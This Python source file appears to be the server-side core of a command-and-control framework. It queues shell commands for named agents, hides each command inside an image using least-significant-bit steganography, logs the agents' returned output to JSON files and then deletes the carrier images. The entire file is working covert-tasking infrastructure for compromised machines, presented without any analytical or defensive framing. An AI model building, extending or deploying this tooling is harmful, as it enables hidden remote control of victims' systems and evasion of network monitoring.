from json import loads, dumps
from base64 import b64encode, b64decode
from werkzeug.utils import secure_filename
from uuid import uuid4
from bin.steganography import Steganography

import os

class C2:
    @staticmethod
    def get_next_command(agent, source_image) -> tuple:
        target = os.path.join('data', secure_filename(f"c2-{agent}.json"))
        if not agent or not os.path.exists(target): return (None, None)
        with open(target, 'r', encoding='utf8') as text_file:
            c2 = loads(text_file.read())
            for command in c2['commands']:
                if not 'rsp' in command:
                    cmd = command['cmd']
                    print(f"[!] Embedding command for agent {agent}:\n\t{cmd}")
                    id = str(uuid4()).split('-')[0]
                    response = dumps({ 'id': id, 'ts': command['ts'], 'cmd': cmd})
                    command['lsb_image'] = Steganography.get_target_path_for_agent(source_image, id)
                    text_file.close()
                    C2.write_to_file(target, c2)

                    return (id, b64encode(response.encode()).decode())
        return (None, None)
    
    @staticmethod
    def persist_result(key, id, result):
        target = os.path.join('data', secure_filename(f"c2-{key}.json"))
        if not key or not os.path.exists(target): return '', 404
        with open(target, 'r', encoding='utf8') as text_file:
            c2 = loads(text_file.read())
            for command in c2['commands']:
                if str(command['ts']) == str(id):
                    command['rsp'] = b64decode(result).decode('utf-8')
                    text_file.close()
                    if os.path.exists(command['lsb_image']):
                        os.remove(command['lsb_image'])
                    command['lsb_image'] = None
                    C2.write_to_file(target, c2)
                    break

    @staticmethod
    def write_to_file(file: str, current: dict):
        with open(file, 'w', encoding='utf8') as text_file:
            text_file.write(dumps(current))
